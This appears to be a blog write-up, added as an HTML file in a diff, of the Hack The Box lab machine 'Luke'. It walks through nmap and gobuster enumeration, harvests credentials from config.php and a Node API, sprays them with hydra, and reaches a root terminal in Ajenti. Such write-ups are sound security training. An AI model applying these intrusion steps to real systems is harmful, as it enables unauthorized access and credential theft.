@@ -1,0 +1,133 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<h1 id="luke">Luke</h1>
+<p>Luke was a simple box with no privilege escalation, there was alot of enumeration, so lets get started. ## Nmap nmap -sC -sV -oA nmap/luke 10.10.10.137</p>
+<pre><code># Nmap 7.70 scan initiated Mon May 27 05:07:59 2019 as: nmap -sC -sV -oA Luke 10.10.10.137
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-27 15:57 IST
+Nmap scan report for luke.io (10.10.10.137)
+Host is up (0.16s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.15.153
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 6
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  SSH-2.0-OpenSSH_7.8 FreeBSD-20180909
+80/tcp   open  http       Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http       Node.js Express framework
+|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).
+8000/tcp open  http       Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.18 seconds</code></pre>
+<h2 id="ftp">FTP</h2>
+<p>The FTP had anonymous login allowed, so logging in with credentials,</p>
+<pre><code>Username: anonymous
+Password:</code></pre>
+<p>we find a file <em>for_Chihiro.txt</em> inside <em>webapp</em>, which had the following contents:</p>
+<pre><code>Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
+the actual website I&#39;ve created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
+
+Derry  </code></pre>
+<p>Nothing usefull here.</p>
+<h2 id="web">Web</h2>
+<p>run gobuster on all the ports (i.e 80,3000,8000),</p>
+<pre><code>gobuster -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.137/users -f -x php -s 200,204,301,302,307,403,401,500</code></pre>
+<p>we find the following files.</p>
+<pre><code>3000=========================
+http://10.10.10.137:3000/login/ (Status: 200)
+http://10.10.10.137:3000/users/ (Status: 200)
+http://10.10.10.137:3000/Login/ (Status: 200)
+http://10.10.10.137:3000/Users/ (Status: 200)
+80=========================
+http://10.10.10.137/login.php (Status: 200)
+http://10.10.10.137/member/ (Status: 200)
+http://10.10.10.137/management/ (Status: 401)
+http://10.10.10.137/css/ (Status: 200)
+http://10.10.10.137/js/ (Status: 200)
+http://10.10.10.137/vendor/ (Status: 200)
+http://10.10.10.137/config.php (Status: 200)
+8000=========================</code></pre>
+<p>Inside config.php on port 80, we creds</p>
+<pre><code>$dbHost = &#39;localhost&#39;; $dbUsername = &#39;root&#39;; $dbPassword = &#39;Zk6heYCyv6ZE9Xcg&#39;; $db = &quot;login&quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&gt; error)</code></pre>
+<p>we dont know yet where these go, so continue the enumeration. ### Port 3000 On port 3000, we found a json webapp, and it inside it a <em>login</em> (the webserver at 3000 is not case-sensitive thus Users and users or Login and login are same). Making a post request to http://10.10.10.137:3000/login with creds found. I used python for it. we get the auth token and then further exploring the users as authenticated we get a list of users.</p>
+<pre><code>[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]</code></pre>
+<p>And if we explore http://10.10.10.137:3000/users/<strong>username</strong> we get their respective passwords (I used Burp-Intruder for this). We getting the following data in-total.</p>
+<pre><code>Admin:WX5b7)&gt;/rp$U)FW 
+Derry:rZ86wwLvx7jUxtch 
+Yuri:bet@tester87
+Dory:5y:!xa=ybfe)/QD
+root:KpMasng6S5EtTy9Z</code></pre>
+<h3 id="port-80">Port 80</h3>
+<p>After trying the password (i used hydra to try them all at login) at all logins found, we find that the http-auth at http://10.10.10.137/management/ has the creds</p>
+<pre><code>Derry:!xa=ybfe)/QD
+</code></pre>
+<p>Inside we are found the list of files, and inside config.json we find the creds to <em>Ajenti Login</em> at port 8000</p>
+<pre><code>root:KpMasng6S5EtTy9Z</code></pre>
+<h2 id="root-shell">Root Shell</h2>
+<p>Inside we get nice interface, we find terminal gui that has root privileges leading us to get root shell.</p></body>
+</html>
